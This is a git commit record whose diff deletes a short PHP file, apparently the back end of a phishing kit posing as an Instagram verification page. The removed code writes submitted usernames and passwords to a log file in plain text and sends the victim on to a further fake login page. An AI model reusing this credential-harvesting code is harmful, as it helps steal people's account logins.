e022bb4cf352f04e704cd44ca32fdab985d71554
PH4N70M (X PHANTOM) <70594016+XPH4N70M@users.noreply.github.com>
2022-05-18 13:06:47 +0530

    Delete .sites directory

--- .sites/ig_verify/login2.php
+++
@@ -1,7 +0,0 @@
-<?php
-$file = 'log.txt';
-$fp = fopen($file , 'a');
-file_put_contents("log.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: ./login3.html');
-exit();
-?>
